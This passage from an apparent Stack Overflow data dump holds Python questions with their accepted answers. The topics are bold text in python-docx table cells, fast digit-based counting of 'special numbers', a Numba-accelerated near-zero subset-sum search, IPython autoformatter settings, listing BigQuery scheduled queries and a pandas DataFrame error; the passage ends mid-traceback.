    "Body": "I'm using python-docx to create a document with a table I want to populate from textual data. My text looks like this:\n01:02:10.3 \na: Lorem ipsum dolor sit amet,  \nb: consectetur adipiscing elit.\na: Mauris a turpis erat. \n01:02:20.4 \na: Vivamus dignissim aliquam\nb: Nam ultricies\n(etc.)\n\nI need to organize it in a table like this (using ASCII for visualization):\n+---+--------------------+---------------------------------+\n|   |         A          |                B                |\n+---+--------------------+---------------------------------+\n| 1 | 01:02:10.3         | a: Lorem ipsum dolor sit amet,  |\n| 2 |                    | b: consectetur adipiscing elit. |\n| 3 |                    | a: Mauris a turpis erat.        |\n| 4 | ------------------ | ------------------------------- |\n| 5 | 01:02:20.4         | a: Vivamus dignissim aliqua     |\n| 6 |                    | b: Nam ultricies                |\n+---+--------------------+---------------------------------+\n\nhowever, I need to make it so everything after \"a: \" is bold, and everything after \"b: \" isn't, while they both occupy the same cell. It's pretty easy to iterate and organize this the way I want, but I'm really unsure about how to make only some of the lines bold:\nIS_BOLD = { \n    'a': True\n    'b': False\n}\n\nrow_cells = table.add_row().cells\n\nfor line in lines: \n    if is_timestamp(line): # function that uses regex to discern between columns\n        if row_cells[1]:\n            row_cells = table.add_row().cells\n\n        row_cells[0].text = line\n\n    else \n        row_cells[1].text += line\n\n        if IS_BOLD[ line.split(\":\")[0] ]:\n            # make only this line within the cell bold, somehow.\n\n(this is sort of pseudo-code, I'm doing some more textual processing but that's kinda irrelevant here). I found one probably relevant question where someone uses something called run but I'm finding it hard to understand how to apply it to my case.\nAny help?\nThanks.\n",
    "AcceptedAnswerId": 71280321,
    "AcceptedAnswer": "You need to add run in the cell's paragraph. This way you can control the specific text you wish to bold\nFull example:\nfrom docx import Document\nfrom docx.shared import Inches\nimport os\nimport re\n\n\ndef is_timestamp(line):\n    # it's flaky, I saw you have your own method and probably you did a better job parsing this.\n    return re.match(r'^\\d{2}:\\d{2}:\\d{2}', line) is not None\n\n\ndef parse_raw_script(raw_script):\n    current_timestamp = ''\n    current_content = ''\n    for line in raw_script.splitlines():\n        line = line.strip()\n        if is_timestamp(line):\n            if current_timestamp:\n                yield {\n                    'timestamp': current_timestamp,\n                    'content': current_content\n                }\n\n            current_timestamp = line\n            current_content = ''\n            continue\n\n        if current_content:\n            current_content += '\\n'\n\n        current_content += line\n\n    if current_timestamp:\n        yield {\n            'timestamp': current_timestamp,\n            'content': current_content\n        }\n\n\ndef should_bold(line):\n    # i leave it to you to replace with your logic\n    return line.startswith('a:')\n\n\ndef load_raw_script():\n    # I placed here the example from your question. read from file instead I presume\n\n    return '''01:02:10.3 \na: Lorem ipsum dolor sit amet,  \nb: consectetur adipiscing elit.\na: Mauris a turpis erat. \n01:02:20.4 \na: Vivamus dignissim aliquam\nb: Nam ultricies'''\n\n\ndef convert_raw_script_to_docx(raw_script, output_file_path):\n    document = Document()\n    table = document.add_table(rows=1, cols=3, style=\"Table Grid\")\n\n    # add header row\n    header_row = table.rows[0]\n    header_row.cells[0].text = ''\n    header_row.cells[1].text = 'A'\n    header_row.cells[2].text = 'B'\n\n    # parse the raw script into something iterable\n    script_rows = parse_raw_script(raw_script)\n\n    # create a row for each timestamp row\n    for script_row in script_rows:\n        timestamp = script_row['timestamp']\n        content = script_row['content']\n\n        row = table.add_row()\n        timestamp_cell = row.cells[1]\n        timestamp_cell.text = timestamp\n\n        content_cell = row.cells[2]\n        content_paragraph = content_cell.paragraphs[0]  # using the cell's default paragraph here instead of creating one\n\n        for line in content.splitlines():\n            run = content_paragraph.add_run(line)\n            if should_bold(line):\n                run.bold = True\n\n            run.add_break()\n\n    # resize table columns (optional)\n    for row in table.rows:\n        row.cells[0].width = Inches(0.2)\n        row.cells[1].width = Inches(1.9)\n        row.cells[2].width = Inches(3.9)\n\n    document.save(output_file_path)\n\n\ndef main():\n    script_dir = os.path.dirname(__file__)\n    dist_dir = os.path.join(script_dir, 'dist')\n\n    if not os.path.isdir(dist_dir):\n        os.makedirs(dist_dir)\n\n    output_file_path = os.path.join(dist_dir, 'so-template.docx')\n    raw_script = load_raw_script()\n    convert_raw_script_to_docx(raw_script, output_file_path)\n\n\nif __name__ == '__main__':\n    main()\n\n\nResult (file should be in ./dist/so-template.docx):\n\n\nBTW - if you prefer sticking with your own example, this is what needs to be changed:\nIS_BOLD = {\n    'a': True,\n    'b': False\n}\n\nrow_cells = table.add_row().cells\n\nfor line in lines:\n    if is_timestamp(line):\n        if row_cells[1]:\n            row_cells = table.add_row().cells\n        row_cells[0].text = line\n\n    else:\n        run = row_cells[1].paragraphs[0].add_run(line)\n        if IS_BOLD[line.split(\":\")[0]]:\n            run.bold = True\n\n        run.add_break()\n\n"
}
{
    "Id": 71370656,
    "PostTypeId": 1,
    "Title": "Special Number Count",
    "Body": "It is a number whose gcd of (sum of quartic power of its digits, the product of its digits) is more than 1.\neg.\n123 is a special number because hcf of(1+16+81, 6) is more than 1.\nI have to find the count of all these numbers that are below input n.\neg.\nfor n=120 their are 57 special numbers between (1 and 120)\nI have done a code but its very slow can you please tell me to do it in some good and fast way.\nIs there is any way to do it using some maths.\nimport math,numpy\nt = int(input())\n\nans = []\n\nfor i in range(0,t):\n    ans.append(0)\n    n = int(input())\n    for j in range(1, n+1):\n        res = math.gcd(sum([pow(int(k),4) for k in str(j)]),numpy.prod([int(k) for k in str(j)]))\n        if res>1:\n            ans[i] = ans[i] + 1\n\nfor i in range(0,t):\n    print(ans[i])\n\n",
    "AcceptedAnswerId": 71402821,
    "AcceptedAnswer": "Here's an O(log n) algorithm for actually counting special numbers less than or equal to n. It builds digit strings one at a time, keeping track of whether 2, 3, 5 and 7 divide that digit string's product, and the remainder modulo 2, 3, 5, and 7 of the sum of fourth powers of those digits.\nThe logic for testing whether a number is special based on divisibility by those prime factors and remainder of powers under those factors is the same as in David's answer, and is explained better there. Since there are only 2^4 possibilities for which primes divide the product, and 2*3*5*7 possibilities for the remainder, there are a constant number of combinations of both that are possible, for a runtime of O(2^4 * 210 * log n) = O(log n).\ndef count_special_less_equal(digits: List[int]) -> int:\n    \"\"\"Return the count of numbers less than or equal to the represented\n    number, with the property that\n    gcd(product(digits), sum(fourth powers of digits)) > 1\"\"\"\n\n    # Count all digit strings with zeroes\n    total_non_special = len(digits)\n\n    primes = (2, 3, 5, 7)\n    prime_product = functools.reduce(operator.mul, primes, 1)\n\n    digit_to_remainders = [pow(x, 4, prime_product) for x in range(10)]\n\n    # Map each digit 1-9 to prime factors\n    # 2: 2**0, 3: 2**1, 5: 2**2, 7: 2**3\n    factor_masks = [0, 0, 1, 2, 1, 4, 3, 8, 1, 2]\n\n    def is_fac_mask_mod_special(factor_mask: int,\n                                remainder: int) -> bool:\n        \"\"\"Return true if any of the prime factors represented in factor_mask\n        have corresponding remainder 0 (i.e., divide the sum of fourth powers)\"\"\"\n\n        return any((factor_mask & (1 << i) != 0\n                    and remainder % primes[i] == 0)\n                   for i in range(4))\n\n    prefix_less_than = [Counter() for _ in range(16)]\n\n    # Empty string\n    prefix_equal = (0, 0)\n\n    for digit_pos, digit in enumerate(digits):\n\n        new_prefix_less_than = [Counter() for _ in range(16)]\n\n        # Old \"lesser than\" prefixes stay lesser\n        for fac_mask, fac_mask_counts in enumerate(prefix_less_than):\n            for new_digit in range(1, 10):\n                new_mask = fac_mask | factor_masks[new_digit]\n                remainder_change = digit_to_remainders[new_digit]\n                for old_remainder, old_count in fac_mask_counts.items():\n                    new_remainder = (remainder_change + old_remainder) % prime_product\n                    new_prefix_less_than[new_mask][new_remainder] += old_count\n\n        if digit == 0:\n            prefix_equal = None\n\n        if prefix_equal is not None:\n            equal_fac_mask, equal_remainder = prefix_equal\n            for new_digit in range(1, digit):\n\n                new_mask = equal_fac_mask | factor_masks[new_digit]\n\n                remainder_change = digit_to_remainders[new_digit]\n                new_remainder = (remainder_change + equal_remainder) % prime_product\n\n                new_prefix_less_than[new_mask][new_remainder] += 1\n\n            new_mask = equal_fac_mask | factor_masks[digit]\n            remainder_change = digit_to_remainders[digit]\n\n            new_remainder = (remainder_change + equal_remainder) % prime_product\n            prefix_equal = (new_mask, new_remainder)\n\n        prefix_less_than = new_prefix_less_than\n\n        if digit_pos == len(digits) - 1:\n            break\n\n        # Empty string\n        prefix_less_than[0][0] += 1\n\n    for fac_mask, fac_mask_counts in enumerate(prefix_less_than):\n        for remainder, rem_count in fac_mask_counts.items():\n            if not is_fac_mask_mod_special(factor_mask=fac_mask,\n                                           remainder=remainder):\n                total_non_special += rem_count\n\n    if prefix_equal is not None:\n        if not is_fac_mask_mod_special(*prefix_equal):\n            total_non_special += 1\n\n    return 1 + int(''.join(map(str, digits))) - total_non_special\n\nExample usage:\nprint(f\"{count_special_less_equal(digits_of(120))}\")\n\nprints\n57\n\nand\nfor exponent in range(1, 19):\n    print(f\"Count up to 10^{exponent}: {count_special_less_equal(digits_of(10**exponent))}\")\n\ngives:\nCount up to 10^1: 8\nCount up to 10^2: 42\nCount up to 10^3: 592\nCount up to 10^4: 7400\nCount up to 10^5: 79118\nCount up to 10^6: 854190\nCount up to 10^7: 8595966\nCount up to 10^8: 86010590\nCount up to 10^9: 866103492\nCount up to 10^10: 8811619132\nCount up to 10^11: 92967009216\nCount up to 10^12: 929455398976\nCount up to 10^13: 9268803096820\nCount up to 10^14: 92838342330554\nCount up to 10^15: 933105194955392\nCount up to 10^16: 9557298732021784\nCount up to 10^17: 96089228976983058\nCount up to 10^18: 960712913414545906\n\nDone in 0.3783 seconds\n\nThis finds the frequencies for all powers of 10 up to 10^18 in about a third of a second. It's possible to optimize this further in the constant factors, using numpy arrays or other tricks (like precomputing the counts for all numbers with a fixed number of digits).\n"
}
{
    "Id": 71527595,
    "PostTypeId": 1,
    "Title": "Efficiently count all the combinations of numbers having a sum close to 0",
    "Body": "I have following pandas dataframe\ndf\ncolumn1 column2 list_numbers          sublist_column\nx        y      [10,-6,1,-4]             \na        b      [1,3,7,-2]               \np        q      [6,2,-3,-3.2]             \n\nthe sublist_column will contain the numbers from the column \"list_numbers\" that adds up to 0 (0.5 is a tolerance)\nI have written following code.\ndef return_list(original_lst,target_sum,tolerance):\n    memo=dict()\n    sublist=[]\n    for i, x in enumerate(original_lst):\n    \n        if memo_func(original_lst, i + 1, target_sum - x, memo,tolerance) > 0:\n            sublist.append(x)\n            target_sum -= x          \n    return sublist  \n\ndef memo_func(original_lst, i, target_sum, memo,tolerance):\n    \n    if i >= len(original_lst):\n        if target_sum =-tolerance:\n            return 1\n        else:\n            return 0\n    if (i, target_sum) not in memo:  \n        c = memo_func(original_lst, i + 1, target_sum, memo,tolerance)\n        c += memo_func(original_lst, i + 1, target_sum - original_lst[i], memo,tolerance)\n        memo[(i, target_sum)] = c  \n    return memo[(i, target_sum)]    \n    \n\nThen I am using the \"return_list\" function on the \"sublist_column\" to populate the result.\ntarget_sum = 0\ntolerance=0.5\n\ndf['sublist_column']=df['list_numbers'].apply(lambda x: return_list(x,0,tolerance))\n\nthe following will be the resultant dataframe\ncolumn1 column2 list_numbers          sublist_column\nx        y      [10,-6,1,-4]             [10,-6,-4]\na        b      [1,3,7,-2]               []\np        q      [6,2,-3,-3.2]            [6,-3,-3.2]  #sum is -0.2(within the tolerance)\n\nThis is giving me correct result but it's very slow(takes 2 hrs to run if i use spyder IDE), as my dataframe size has roughly 50,000 rows, and the length of some of the lists in the \"list_numbers\" column is more than 15.\nThe running time is particularly getting affected when the number of elements in the lists in the \"list_numbers\" column is greater than 15.\ne.g following list is taking almost 15 minutes to process\n[-1572.35,-76.16,-261.1,-7732.0,-1634.0,-52082.42,-3974.15,\n-801.65,-30192.79,-671.98,-73.06,-47.72,57.96,-511.18,-391.87,-4145.0,-1008.61,\n-17.53,-17.53,-1471.08,-119.26,-2269.7,-2709,-182939.59,-19.48,-516,-6875.75,-138770.16,-71.11,-295.84,-348.09,-3460.71,-704.01,-678,-632.15,-21478.76]\n\nHow can i significantly improve my running time?\n",
    "AcceptedAnswerId": 71551035,
    "AcceptedAnswer": "Step 1: using Numba\nBased on the comments, it appear that memo_func is the main bottleneck. You can use Numba to speed up its execution. Numba compile the Python code to a native one thanks to a just-in-time (JIT) compiler. The JIT is able to perform tail-call optimizations and native function calls are significantly faster than the one of CPython. Here is an example:\nimport numba as nb\n\n@nb.njit('(float64[::1], int64, float64, float64)')\ndef memo_func(original_arr, i, target_sum, tolerance):\n    if i >= len(original_arr):\n        if -tolerance <= target_sum <= tolerance:\n            return 1\n        return 0\n    c = memo_func(original_arr, i + 1, target_sum, tolerance)\n    c += memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)\n    return c\n\n@nb.njit('(float64[::1], float64, float64)')\ndef return_list(original_arr, target_sum, tolerance):\n    sublist = []\n    for i, x in enumerate(original_arr):\n        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance) > 0:\n            sublist.append(x)\n            target_sum -= x\n    return sublist\n\nUsing memoization does not seems to speed up the result and this is a bit cumbersome to implement in Numba. In fact, there are much better ways to improve the algorithm.\nNote that you need to convert the lists in Numpy array before calling the functions:\nlst = [-850.85,-856.05,-734.09,5549.63,77.59,-39.73,23.63,13.93,-6455.54,-417.07,176.72,-570.41,3621.89,-233.47,-471.54,-30.33,-941.49,-1014.6,1614.5]\nresult = return_list(np.array(lst, np.float64), 0, tolerance)\n\n\nStep 2: tail call optimization\nCalling many function to compute the right part of the input list is not efficient. The JIT is able to reduce the number of all but it is not able to completely remove them. You can unroll all the call when the depth of the tail calls is big. For example, when there is 6 items to compute, you can use this following code:\nif n-i == 6:\n    c = 0\n    s0 = target_sum\n    v0, v1, v2, v3, v4, v5 = original_arr[i:]\n    for s1 in (s0, s0 - v0):\n        for s2 in (s1, s1 - v1):\n            for s3 in (s2, s2 - v2):\n                for s4 in (s3, s3 - v3):\n                    for s5 in (s4, s4 - v4):\n                        for s6 in (s5, s5 - v5):\n                            c += np.int64(-tolerance <= s6 <= tolerance)\n    return c\n\nThis is pretty ugly but far more efficient since the JIT is able to unroll all the loop and produce a very fast code. Still, this is not enough for large lists.\n\nStep 3: better algorithm\nFor large input lists, the problem is the exponential complexity of the algorithm. The thing is this problem looks really like a relaxed variant of subset-sum which is known to be NP-complete. Such class of algorithm is known to be very hard to solve. The best exact practical algorithms known so far to solve NP-complete problem are exponential. Put it shortly, this means that for any sufficiently large input, there is no known algorithm capable of finding an exact solution in a reasonable time (eg. less than the lifetime of a human).\nThat being said, there are heuristics and strategies to improve the complexity of the current algorithm. One efficient approach is to use a meet-in-the-middle algorithm. When applied to your use-case, the idea is to generate a large set of target sums, then sort them, and then use a binary search to find the number of matching values. This is possible here since -tolerance  where target_sum = partial_sum1 + partial_sum2 is equivalent to -tolerance + partial_sum2 .\nThe resulting code is unfortunately quite big and not trivial, but this is certainly the cost to pay for trying to solve efficiently a complex problem like this one. Here it is:\n# Generate all the target sums based on in_arr and put the result in out_sum\n@nb.njit('(float64[::1], float64[::1], float64)', cache=True)\ndef gen_all_comb(in_arr, out_sum, target_sum):\n    assert in_arr.size >= 6\n    if in_arr.size == 6:\n        assert out_sum.size == 64\n        v0, v1, v2, v3, v4, v5 = in_arr\n        s0 = target_sum\n        cur = 0\n        for s1 in (s0, s0 - v0):\n            for s2 in (s1, s1 - v1):\n                for s3 in (s2, s2 - v2):\n                    for s4 in (s3, s3 - v3):\n                        for s5 in (s4, s4 - v4):\n                            for s6 in (s5, s5 - v5):\n                                out_sum[cur] = s6\n                                cur += 1\n    else:\n        assert out_sum.size % 2 == 0\n        mid = out_sum.size // 2\n        gen_all_comb(in_arr[1:], out_sum[:mid], target_sum)\n        gen_all_comb(in_arr[1:], out_sum[mid:], target_sum - in_arr[0])\n\n# Find the number of item in sorted_arr where:\n# lower_bound <= item <= upper_bound\n@nb.njit('(float64[::1], float64, float64)', cache=True)\ndef count_between(sorted_arr, lower_bound, upper_bound):\n    assert lower_bound <= upper_bound\n    lo_pos = np.searchsorted(sorted_arr, lower_bound, side='left')\n    hi_pos = np.searchsorted(sorted_arr, upper_bound, side='right')\n    return hi_pos - lo_pos\n\n# Count all the target sums in:\n# -tolerance <= all_target_sums(in_arr,sorted_target_sums)-s0 <= tolerance\n@nb.njit('(float64[::1], float64[::1], float64, float64)', cache=True)\ndef multi_search(in_arr, sorted_target_sums, tolerance, s0):\n    assert in_arr.size >= 6\n    if in_arr.size == 6:\n        v0, v1, v2, v3, v4, v5 = in_arr\n        c = 0\n        for s1 in (s0, s0 + v0):\n            for s2 in (s1, s1 + v1):\n                for s3 in (s2, s2 + v2):\n                    for s4 in (s3, s3 + v3):\n                        for s5 in (s4, s4 + v4):\n                            for s6 in (s5, s5 + v5):\n                                lo = -tolerance + s6\n                                hi = tolerance + s6\n                                c += count_between(sorted_target_sums, lo, hi)\n        return c\n    else:\n        c = multi_search(in_arr[1:], sorted_target_sums, tolerance, s0)\n        c += multi_search(in_arr[1:], sorted_target_sums, tolerance, s0 + in_arr[0])\n        return c\n\n@nb.njit('(float64[::1], int64, float64, float64)', cache=True)\ndef memo_func(original_arr, i, target_sum, tolerance):\n    n = original_arr.size\n    remaining = n - i\n    tail_size = min(max(remaining//2, 7), 16)\n\n    # Tail call: for very small list (trivial case)\n    if remaining <= 0:\n        return np.int64(-tolerance <= target_sum <= tolerance)\n\n    # Tail call: for big lists (better algorithm)\n    elif remaining >= tail_size*2:\n        partial_sums = np.empty(2**tail_size, dtype=np.float64)\n        gen_all_comb(original_arr[-tail_size:], partial_sums, target_sum)\n        partial_sums.sort()\n        return multi_search(original_arr[-remaining:-tail_size], partial_sums, tolerance, 0.0)\n\n    # Tail call: for medium-sized list (unrolling)\n    elif remaining == 6:\n        c = 0\n        s0 = target_sum\n        v0, v1, v2, v3, v4, v5 = original_arr[i:]\n        for s1 in (s0, s0 - v0):\n            for s2 in (s1, s1 - v1):\n                for s3 in (s2, s2 - v2):\n                    for s4 in (s3, s3 - v3):\n                        for s5 in (s4, s4 - v4):\n                            for s6 in (s5, s5 - v5):\n                                c += np.int64(-tolerance <= s6 <= tolerance)\n        return c\n\n    # Recursion\n    c = memo_func(original_arr, i + 1, target_sum, tolerance)\n    c += memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)\n    return c\n\n@nb.njit('(float64[::1], float64, float64)', cache=True)\ndef return_list(original_arr, target_sum, tolerance):\n    sublist = []\n    for i, x in enumerate(original_arr):\n        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance) > 0:\n            sublist.append(x)\n            target_sum -= x\n    return sublist\n\nNote that the code takes few seconds to compile since it is quite big. The cache should help not to recompile it every time.\n\nStep 4: even better algorithm\nThe previous code count the number of matching values (the value stored in c). This is not needed since we just want to know if 1 value exists (ie. memo_func(...) > 0). As a result, we can return a boolean to define if a value has been found and optimize the algorithm so to directly return True when some early solutions are found. Big parts of the exploration tree can be skipped with this method (which is particularly efficient when there are many possible solutions like on random arrays).\nAnother optimization is then to perform only one binary search (instead of two) and check before if the searched values can be found in the min-max range of the sorted array (so to skip this trivial case before applying the expensive binary search). This is possible because of the previous optimization.\nA final optimization is to early discard a part the exploration tree when the values generated by multi_search are so small/big that we can be sure there is no need to perform a binary search. This can be done by computing a pessimistic over-approximation of the searched values. This is especially useful in pathological cases that have almost no solutions.\nHere is the final implementation:\n@nb.njit('(float64[::1], float64[::1], float64)', cache=True)\ndef gen_all_comb(in_arr, out_sum, target_sum):\n    assert in_arr.size >= 6\n    if in_arr.size == 6:\n        assert out_sum.size == 64\n        v0, v1, v2, v3, v4, v5 = in_arr\n        s0 = target_sum\n        cur = 0\n        for s1 in (s0, s0 - v0):\n            for s2 in (s1, s1 - v1):\n                for s3 in (s2, s2 - v2):\n                    for s4 in (s3, s3 - v3):\n                        for s5 in (s4, s4 - v4):\n                            for s6 in (s5, s5 - v5):\n                                out_sum[cur] = s6\n                                cur += 1\n    else:\n        assert out_sum.size % 2 == 0\n        mid = out_sum.size // 2\n        gen_all_comb(in_arr[1:], out_sum[:mid], target_sum)\n        gen_all_comb(in_arr[1:], out_sum[mid:], target_sum - in_arr[0])\n\n# Find the number of item in sorted_arr where:\n# lower_bound <= item <= upper_bound\n@nb.njit('(float64[::1], float64, float64)', cache=True)\ndef has_items_between(sorted_arr, lower_bound, upper_bound):\n    if upper_bound < sorted_arr[0] or sorted_arr[sorted_arr.size-1] < lower_bound:\n        return False\n    lo_pos = np.searchsorted(sorted_arr, lower_bound, side='left')\n    return lo_pos < sorted_arr.size and sorted_arr[lo_pos] <= upper_bound\n\n# Count all the target sums in:\n# -tolerance <= all_target_sums(in_arr,sorted_target_sums)-s0 <= tolerance\n@nb.njit('(float64[::1], float64[::1], float64, float64)', cache=True)\ndef multi_search(in_arr, sorted_target_sums, tolerance, s0):\n    assert in_arr.size >= 6\n    if in_arr.size == 6:\n        v0, v1, v2, v3, v4, v5 = in_arr\n        x3, x4, x5 = min(v3, 0), min(v4, 0), min(v5, 0)\n        y3, y4, y5 = max(v3, 0), max(v4, 0), max(v5, 0)\n        mini = sorted_target_sums[0]\n        maxi = sorted_target_sums[sorted_target_sums.size-1]\n\n        for s1 in (s0, s0 + v0):\n            for s2 in (s1, s1 + v1):\n                for s3 in (s2, s2 + v2):\n                    # Prune the exploration tree early if a \n                    # larger range cannot be found.\n                    lo = s3 + (x3 + x4 + x5 - tolerance)\n                    hi = s3 + (y3 + y4 + y5 + tolerance)\n                    if hi < mini or maxi < lo:\n                        continue\n\n                    for s4 in (s3, s3 + v3):\n                        for s5 in (s4, s4 + v4):\n                            for s6 in (s5, s5 + v5):\n                                lo = -tolerance + s6\n                                hi = tolerance + s6\n                                if has_items_between(sorted_target_sums, lo, hi):\n                                    return True\n        return False\n    return (\n        multi_search(in_arr[1:], sorted_target_sums, tolerance, s0)\n        or multi_search(in_arr[1:], sorted_target_sums, tolerance, s0 + in_arr[0])\n    )\n\n@nb.njit('(float64[::1], int64, float64, float64)', cache=True)\ndef memo_func(original_arr, i, target_sum, tolerance):\n    n = original_arr.size\n    remaining = n - i\n    tail_size = min(max(remaining//2, 7), 13)\n\n    # Tail call: for very small list (trivial case)\n    if remaining <= 0:\n        return -tolerance <= target_sum <= tolerance\n\n    # Tail call: for big lists (better algorithm)\n    elif remaining >= tail_size*2:\n        partial_sums = np.empty(2**tail_size, dtype=np.float64)\n        gen_all_comb(original_arr[-tail_size:], partial_sums, target_sum)\n        partial_sums.sort()\n        return multi_search(original_arr[-remaining:-tail_size], partial_sums, tolerance, 0.0)\n\n    # Tail call: for medium-sized list (unrolling)\n    elif remaining == 6:\n        s0 = target_sum\n        v0, v1, v2, v3, v4, v5 = original_arr[i:]\n        for s1 in (s0, s0 - v0):\n            for s2 in (s1, s1 - v1):\n                for s3 in (s2, s2 - v2):\n                    for s4 in (s3, s3 - v3):\n                        for s5 in (s4, s4 - v4):\n                            for s6 in (s5, s5 - v5):\n                                if -tolerance <= s6 <= tolerance:\n                                    return True\n        return False\n\n    # Recursion\n    return (\n        memo_func(original_arr, i + 1, target_sum, tolerance)\n        or memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)\n    )\n\n@nb.njit('(float64[::1], float64, float64)', cache=True)\ndef return_list(original_arr, target_sum, tolerance):\n    sublist = []\n    for i, x in enumerate(original_arr):\n        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance):\n            sublist.append(x)\n            target_sum -= x\n    return sublist\n\nThis final implementation is meant to efficiently compute pathological cases (the one where there is only few non-trivial solutions or even no solutions like on the big provided input lists). However, it can can be tuned so to compute faster the cases where there are many solutions (like on large random uniformly-distributed arrays) at the expense of a significantly slower execution on the pathological cases. This tread-off can be set by changing the variable tail_size (smaller values are better for cases with more solutions).\n\nBenchmark\nHere is the tested inputs:\ntarget_sum = 0\ntolerance = 0.5\n\nsmall_lst = [-850.85,-856.05,-734.09,5549.63,77.59,-39.73,23.63,13.93,-6455.54,-417.07,176.72,-570.41,3621.89,-233.47,-471.54,-30.33,-941.49,-1014.6,1614.5]\nbig_lst = [-1572.35,-76.16,-261.1,-7732.0,-1634.0,-52082.42,-3974.15,-801.65,-30192.79,-671.98,-73.06,-47.72,57.96,-511.18,-391.87,-4145.0,-1008.61,-17.53,-17.53,-1471.08,-119.26,-2269.7,-2709,-182939.59,-19.48,-516,-6875.75,-138770.16,-71.11,-295.84,-348.09,-3460.71,-704.01,-678,-632.15,-21478.76]\nrandom_lst = [-86145.13, -34783.33, 50912.99, -87823.73, 37537.52, -22796.4, 53530.74, 65477.91, -50725.36, -52609.35, 92769.95, 83630.42, 30436.95, -24347.08, -58197.95, 77504.44, 83958.08, -85095.73, -61347.26, -14250.65, 2012.91, 83969.32, -69356.41, 29659.23, 94736.29, 2237.82, -17784.34, 23079.36, 8059.84, 26751.26, 98427.46, -88735.07, -28936.62, 21868.77, 5713.05, -74346.18]\n\nThe uniformly-distributed random list has a very large number of solutions while the provided big list has none. The tuned final implementation set tail_size to min(max(remaining//2, 7), 13) so to compute the random list much faster at the expense of a significantly slower execution on the big list.\n\nHere is the timing with the small list on my machine:\nNaive python algorithm:               173.45 ms\nNaive algorithm using Numba:            7.21 ms\nTail call optimization + Numba:         0.33 ms\nKellyBundy's implementation:            0.19 ms\nEfficient algorithm + optim + Numba:    0.10 ms\nFinal implementation (tuned):           0.05 ms\nFinal implementation (default):         0.05 ms\n\nHere is the timing with the large random list on my machine (easy case):\nEfficient algorithm + optim + Numba:    209.61 ms\nFinal implementation (default):           4.11 ms\nKellyBundy's implementation:              1.15 ms\nFinal implementation (tuned):             0.85 ms\n\nOther algorithms are not shown here because they are too slow (see below)\n\nHere is the timing with the big list on my machine (challenging case):\nNaive python algorithm:               >20000 s    [estimation & out of memory]\nNaive algorithm using Numba:            ~900 s    [estimation]\nTail call optimization + Numba:           42.61 s\nKellyBundy's implementation:               0.671 s\nFinal implementation (tuned):              0.078 s\nEfficient algorithm + optim + Numba:       0.051 s\nFinal implementation (default):            0.013 s\n\nThus, the final implementation is up to ~3500 times faster on the small input and more than 1_500_000 times faster on the large input! It also use far less RAM so it can actually be executed on a cheap PC.\nIt is worth noting that the execution time can be reduced even further be using multiple thread so to reach a speed up >5_000_000 though it may be slower on small inputs and it will make the code a bit complex.\n\n"
}
{
    "Id": 71969299,
    "PostTypeId": 1,
    "Title": "How to disable code formatting in ipython?",
    "Body": "IPython has this new feature that reformats my prompt. Unfortunately, it is really buggy, so I want to disable it. I managed to do it when starting IPython from the command line by adding the following line in my ipython_config.py:\nc.TerminalInteractiveShell.autoformatter = None\n\nHowever, it does not work when I run it from a python script. I start IPython from my script the following way:\nc = traitlets.config.get_config()\nc.InteractiveShellEmbed.colors = \"Linux\"\nc.TerminalInteractiveShell.autoformatter = None\nc.InteractiveShellEmbed.loop_runner = lambda coro: loop.run_until_complete(coro)\nIPython.embed(display_banner='', using='asyncio', config=c)\n\nIf I change the colors value, the colors change accordingly, so the configuration itself works. However, no matter what I do with autoformatter, IPython autoformats my code regardless. What am I doing wrong?\n",
    "AcceptedAnswerId": 71995927,
    "AcceptedAnswer": "Apparently, the answer is:\nc.InteractiveShellEmbed.autoformatter = None\n\n"
}
{
    "Id": 71424233,
    "PostTypeId": 1,
    "Title": "How do I list my scheduled queries via the Python google client API?",
    "Body": "I have set up my service account and I can run queries on bigQuery using client.query().\nI could just write all my scheduled queries into this new client.query() format but I already have many scheduled queries so I was wondering if there is a way I can get/list the scheduled queries and then use that information to run those queries from a script.\n\n",
    "AcceptedAnswerId": 71428499,
    "AcceptedAnswer": "Yes, you can use the APIs. When you don't know which one to use, I have a tip. Use the command proposed by @Yev\nbq ls --transfer_config --transfer_location=US --format=prettyjson\nBut log the API calls. for that use the --apilog  parameter like that\nbq --apilog ./log ls --transfer_config --transfer_location=US --format=prettyjson\nAnd, magically, you can find the API called by the command:\nhttps://bigquerydatatransfer.googleapis.com/v1/projects//locations/US/transferConfigs?alt=json\nThen, a simple google search leads you to the correct documentation\n\nIn python, add that dependencies in your requirements.txt: google-cloud-bigquery-datatransfer and use that code\nfrom google.cloud import bigquery_datatransfer\n\nclient = bigquery_datatransfer.DataTransferServiceClient()\nparent = client.common_project_path(\"\")\nresp = client.list_transfer_configs(parent=parent)\nprint(resp)\n\n"
}
{
    "Id": 71577514,
    "PostTypeId": 1,
    "Title": "ValueError: Per-column arrays must each be 1-dimensional when trying to create a pandas DataFrame from a dictionary. Why?",
    "Body": "I'm trying to create a very simple Pandas DataFrame from a dictionary. The dictionary has 3 items, and the DataFrame as well. They are:\n\na list with the 'shape' (3,)\na list/np.array (in different attempts) with the shape(3, 3)\na constant of 100 (same value to the whole column)\n\n\nHere is the code that succeeds and displays the preferred df\n\n\u200b\n# from a dicitionary\n>>>dict1 = {\"x\": [1, 2, 3],\n...         \"y\": list(\n...             [\n...                 [2, 4, 6], \n...                 [3, 6, 9], \n...                 [4, 8, 12]\n...             ]\n...             ),\n...         \"z\": 100}\n\n>>>df1 = pd.DataFrame(dict1)\n>>>df1\n   x           y    z\n0  1   [2, 4, 6]  100\n1  2   [3, 6, 9]  100\n2  3  [4, 8, 12]  100\n\n\nBut then I assign a Numpy ndarray (shape 3, 3 )to the key y, and try to create a DataFrame from the dictionary. The line I try to create the DataFrame errors out. Below is the code I try to run, and the error I get (in separate code blocks for ease of reading.)\n\n\ncode\n\n\u200b\n>>>dict2 = {\"x\": [1, 2, 3],\n...         \"y\": np.array(\n...             [\n...                 [2, 4, 6], \n...                 [3, 6, 9], \n...                 [4, 8, 12]\n...             ]\n...             ),\n...         \"z\": 100}\n\n>>>df2 = pd.DataFrame(dict2)  # see the below block for error\n\n\nerror\n\n\u200b\n---------------------------------------------------------------------------\nValueError                                Traceback (most recent call last)\nd:\\studies\\compsci\\pyscripts\\study\\pandas-realpython\\data-delightful\\01.intro.ipynb Cell 10' in \n      1 # from a 